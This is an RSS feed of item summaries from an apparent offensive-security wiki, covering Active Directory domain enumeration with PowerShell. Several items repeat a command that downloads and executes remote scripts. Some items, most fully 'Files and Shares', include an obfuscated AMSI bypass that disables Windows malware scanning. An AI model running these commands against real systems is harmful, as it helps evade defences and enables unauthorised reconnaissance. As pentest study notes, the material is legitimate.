<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Domain Enumeration on</title><link>https://wiki.bufu-sec.com/active_directory/domain_enumeration/</link><description>Recent content in Domain Enumeration on</description><generator>Hugo -- gohugo.io</generator><language>en-US</language><lastBuildDate>Sat, 06 Nov 2021 10:02:54 +0100</lastBuildDate><atom:link href="https://wiki.bufu-sec.com/active_directory/domain_enumeration/index.xml" rel="self" type="application/rss+xml"/><item><title>Domains</title><link>https://wiki.bufu-sec.com/active_directory/domain_enumeration/domains/</link><pubDate>Sun, 07 Nov 2021 17:46:09 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_enumeration/domains/</guid><description>ActiveDirectory Module # Setup # # If computer has internet access iex (New-Object Net.WebClient).DownloadString(&amp;#39;https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1&amp;#39;);Import-ActiveDirectory # If computer has no internet access, download repository Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1 # Check if module has been imported correctly Get-Command -Module ActiveDirectory Commands # # Get current domain Get-ADDomain # Get object of another domain Get-ADDomain -Identity lab.local # Get domain SID for current domain (Get-ADDomain).DomainSID # Get domain controllers for current domain Get-ADDomainController # Get domain controllers for another domain Get-ADDomainController -DomainName lab.</description></item><item><title>Domain Users</title><link>https://wiki.bufu-sec.com/active_directory/domain_enumeration/domain_users/</link><pubDate>Sun, 07 Nov 2021 17:55:08 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_enumeration/domain_users/</guid><description>ActiveDirectory Module # Setup # # If computer has internet access iex (New-Object Net.WebClient).DownloadString(&amp;#39;https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1&amp;#39;);Import-ActiveDirectory # If computer has no internet access, download repository Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1 # Check if module has been imported correctly Get-Command -Module ActiveDirectory Commands # # Get list of users in current domain Get-ADUser -Filter * -Properties * Get-ADUser -Identity student1 -Properties * Get-ADUser -Filter * -Properties * | Select Name # Get list of all properties for users in current domain Get-ADUser -Filter * -Properties * | Select -First 1 | Get-Member -MemberType *Property | Select Name Get-ADUser -Filter * -Properties * | Select name,@{expression={[datetime]::fromFileTime($_.</description></item><item><title>Domain Computers</title><link>https://wiki.bufu-sec.com/active_directory/domain_enumeration/domain_computers/</link><pubDate>Sun, 07 Nov 2021 18:02:53 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_enumeration/domain_computers/</guid><description>ActiveDirectory Module # Setup # # If computer has internet access iex (New-Object Net.WebClient).DownloadString(&amp;#39;https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1&amp;#39;);Import-ActiveDirectory # If computer has no internet access, download repository Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1 # Check if module has been imported correctly Get-Command -Module ActiveDirectory Commands # # Get list of computers in current domain Get-ADComputer -Filter * -Properties * Get-ADComputer -Filter * | Select Name # Information about operating systems Get-ADComputer -Filter &amp;#39;OperatingSystem -Like &amp;#34;*Server 2016&amp;#34;&amp;#39; -Properties OperatingSystem | Select Name,OperatingSystem # Check for live hosts (depends on ICMP) Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.</description></item><item><title>Domain Groups</title><link>https://wiki.bufu-sec.com/active_directory/domain_enumeration/domain_groups/</link><pubDate>Sun, 07 Nov 2021 17:58:37 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_enumeration/domain_groups/</guid><description>ActiveDirectory Module # Setup # # If computer has internet access iex (New-Object Net.WebClient).DownloadString(&amp;#39;https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1&amp;#39;);Import-ActiveDirectory # If computer has no internet access, download repository Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1 # Check if module has been imported correctly Get-Command -Module ActiveDirectory Commands # # Get all groups in current domain Get-ADGroup -Filter * | Select Name Get-ADGroup -Filter * -Properties * # Get all groups containing the word &amp;#34;admin&amp;#34; in group name Get-ADGroup -Filter &amp;#39;Name -Like &amp;#34;*admin*&amp;#34;&amp;#39; | Select Name # Get all members of Domain Admins group Get-ADGroupMember -Identity &amp;#34;Domain Admins&amp;#34; -Recursive # Get group membership for a user Get-ADPrincipalGroupMembership -Identity student1 PowerView # Setup # # If it gets blocked by AMSI we can bypass it with S`eT-It`em ( &amp;#39;V&amp;#39;+&amp;#39;aR&amp;#39; + &amp;#39;IA&amp;#39; + (&amp;#39;blE:1&amp;#39;+&amp;#39;q2&amp;#39;) + (&amp;#39;uZ&amp;#39;+&amp;#39;x&amp;#39;) ) ( [TYpE]( &amp;#34;{1}{0}&amp;#34;-F&amp;#39;F&amp;#39;,&amp;#39;rE&amp;#39; ) ) ; ( Get-varI`A`BLE ( (&amp;#39;1Q&amp;#39;+&amp;#39;2U&amp;#39;) +&amp;#39;zX&amp;#39; ) -VaL ).</description></item><item><title>Domain OUs</title><link>https://wiki.bufu-sec.com/active_directory/domain_enumeration/domain_ous/</link><pubDate>Sun, 07 Nov 2021 18:09:27 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_enumeration/domain_ous/</guid><description>ActiveDirectory Module # Setup # # If computer has internet access iex (New-Object Net.WebClient).DownloadString(&amp;#39;https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1&amp;#39;);Import-ActiveDirectory # If computer has no internet access, download repository Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1 # Check if module has been imported correctly Get-Command -Module ActiveDirectory Commands # # Get OUs in a domain Get-ADOrganizationalUnit -Filter * -Properties * # Get GPO applied on an OU. Read GPOName from gplink attribute from Get-NetOU Get-GPO -GUID &amp;#34;AB306569-220D-43FF-B03B-83E8F4EF8081&amp;#34; PowerView # Setup # # If it gets blocked by AMSI we can bypass it with S`eT-It`em ( &amp;#39;V&amp;#39;+&amp;#39;aR&amp;#39; + &amp;#39;IA&amp;#39; + (&amp;#39;blE:1&amp;#39;+&amp;#39;q2&amp;#39;) + (&amp;#39;uZ&amp;#39;+&amp;#39;x&amp;#39;) ) ( [TYpE]( &amp;#34;{1}{0}&amp;#34;-F&amp;#39;F&amp;#39;,&amp;#39;rE&amp;#39; ) ) ; ( Get-varI`A`BLE ( (&amp;#39;1Q&amp;#39;+&amp;#39;2U&amp;#39;) +&amp;#39;zX&amp;#39; ) -VaL ).</description></item><item><title>Domain GPOs</title><link>https://wiki.bufu-sec.com/active_directory/domain_enumeration/domain_gpos/</link><pubDate>Sun, 07 Nov 2021 18:06:45 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_enumeration/domain_gpos/</guid><description>General # Security settings Registry-based policy settings GPP like start/shutdown/log-on/logff script settings Software installation Abused for privesc, backdoors, persistence ActiveDirectory Module # Setup # # If computer has internet access iex (New-Object Net.WebClient).DownloadString(&amp;#39;https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1&amp;#39;);Import-ActiveDirectory # If computer has no internet access, download repository Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1 # Check if module has been imported correctly Get-Command -Module ActiveDirectory Commands # # Get list of GPO in current domain Get-GPO -All # Provides RSoP Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.</description></item><item><title>Domain ACLs</title><link>https://wiki.bufu-sec.com/active_directory/domain_enumeration/domain_acl/</link><pubDate>Sun, 07 Nov 2021 18:09:32 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_enumeration/domain_acl/</guid><description>General # Access Control Entries (ACE) correspond to individual permission or audits access Who has permission and what can be done on an object? Two types: DACL -&amp;gt; Defines the permissions trustees (a user or group) have on an object SACL - Logs success and failure audit messages when an object is accessed ActiveDirectory Module # Setup # # If computer has internet access iex (New-Object Net.</description></item><item><title>Domain Trusts</title><link>https://wiki.bufu-sec.com/active_directory/domain_enumeration/domain_trusts/</link><pubDate>Sun, 07 Nov 2021 18:09:42 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_enumeration/domain_trusts/</guid><description>General # Relationship between two domains or forest Trusted Domain Objects (TDOs) represent trust relationship in a domain Types of trusts One-way: users in trusted domain can access resources in the trusting domain Two-way trust: users of both domains can access resources in the other domain Transitive: If A and B trust each other and B and C trust each other, A and C also trust each other (default between domains in same forest) Non-transitive: cannot be extended to other domains in the forest (default between two domains in different forests) Automatic trust: created automatically when creating new subdomain (parent-child, tree-root) Shortcut trusts: used to reduce access time in complex trust scenarios External trusts: between two domains in different forests when forests do not have a turst relationships Forest trusts: between forest root domains ActiveDirectory Module # Setup # # If computer has internet access iex (New-Object Net.</description></item><item><title>Domain Forest Mappings</title><link>https://wiki.bufu-sec.com/active_directory/domain_enumeration/domain_forest_mappings/</link><pubDate>Sun, 07 Nov 2021 18:10:03 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_enumeration/domain_forest_mappings/</guid><description>ActiveDirectory Module # Setup # # If computer has internet access iex (New-Object Net.WebClient).DownloadString(&amp;#39;https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1&amp;#39;);Import-ActiveDirectory # If computer has no internet access, download repository Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1 # Check if module has been imported correctly Get-Command -Module ActiveDirectory Commands # # Get details about the current forest Get-ADForest Get-ADForest -Identity lab.local # Get all domains in the current forest (Get-ADForest).Domains # Get all global catalogs for the current forest Get-ADForest | Select -ExpandProperty GlobalCatalogs # Map trusts of a forest Get-ADTrust -Filter &amp;#39;msDS-TrustForestTrustInfo -ne &amp;#34;$null&amp;#34;&amp;#39; PowerView # Setup # # If it gets blocked by AMSI we can bypass it with S`eT-It`em ( &amp;#39;V&amp;#39;+&amp;#39;aR&amp;#39; + &amp;#39;IA&amp;#39; + (&amp;#39;blE:1&amp;#39;+&amp;#39;q2&amp;#39;) + (&amp;#39;uZ&amp;#39;+&amp;#39;x&amp;#39;) ) ( [TYpE]( &amp;#34;{1}{0}&amp;#34;-F&amp;#39;F&amp;#39;,&amp;#39;rE&amp;#39; ) ) ; ( Get-varI`A`BLE ( (&amp;#39;1Q&amp;#39;+&amp;#39;2U&amp;#39;) +&amp;#39;zX&amp;#39; ) -VaL ).</description></item><item><title>Files and Shares</title><link>https://wiki.bufu-sec.com/active_directory/domain_enumeration/files_and_shares/</link><pubDate>Sun, 07 Nov 2021 18:20:24 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_enumeration/files_and_shares/</guid><description>PowerView # Setup # # If it gets blocked by AMSI we can bypass it with S`eT-It`em ( &amp;#39;V&amp;#39;+&amp;#39;aR&amp;#39; + &amp;#39;IA&amp;#39; + (&amp;#39;blE:1&amp;#39;+&amp;#39;q2&amp;#39;) + (&amp;#39;uZ&amp;#39;+&amp;#39;x&amp;#39;) ) ( [TYpE]( &amp;#34;{1}{0}&amp;#34;-F&amp;#39;F&amp;#39;,&amp;#39;rE&amp;#39; ) ) ; ( Get-varI`A`BLE ( (&amp;#39;1Q&amp;#39;+&amp;#39;2U&amp;#39;) +&amp;#39;zX&amp;#39; ) -VaL ).&amp;#34;A`ss`Embly&amp;#34;.&amp;#34;GET`TY`Pe&amp;#34;(( &amp;#34;{6}{3}{1}{4}{2}{0}{5}&amp;#34; -f(&amp;#39;Uti&amp;#39;+&amp;#39;l&amp;#39;),&amp;#39;A&amp;#39;,(&amp;#39;Am&amp;#39;+&amp;#39;si&amp;#39;),(&amp;#39;.Man&amp;#39;+&amp;#39;age&amp;#39;+&amp;#39;men&amp;#39;+&amp;#39;t.&amp;#39;),(&amp;#39;u&amp;#39;+&amp;#39;to&amp;#39;+&amp;#39;mation.&amp;#39;),&amp;#39;s&amp;#39;,(&amp;#39;Syst&amp;#39;+&amp;#39;em&amp;#39;) ) ).&amp;#34;g`etf`iElD&amp;#34;( ( &amp;#34;{0}{2}{1}&amp;#34; -f(&amp;#39;a&amp;#39;+&amp;#39;msi&amp;#39;),&amp;#39;d&amp;#39;,(&amp;#39;I&amp;#39;+&amp;#39;nitF&amp;#39;+&amp;#39;aile&amp;#39;) ),( &amp;#34;{2}{4}{0}{1}{3}&amp;#34; -f (&amp;#39;S&amp;#39;+&amp;#39;tat&amp;#39;),&amp;#39;i&amp;#39;,(&amp;#39;Non&amp;#39;+&amp;#39;Publ&amp;#39;+&amp;#39;i&amp;#39;),&amp;#39;c&amp;#39;,&amp;#39;c,&amp;#39; )).&amp;#34;sE`T`VaLUE&amp;#34;( ${n`ULl},${t`RuE} ) # Then load the module Import-Module .\PowerView.ps1 . .\PowerView.ps1 # With internet access iex (New-Object Net.WebClient).DownloadString(&amp;#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1&amp;#39;) Commands # # Find shares on hosts in current domain Invoke-ShareFinder -Verbose # Find shares from other domain Invoke-ShareFinder -Domain lab.</description></item></channel></rss>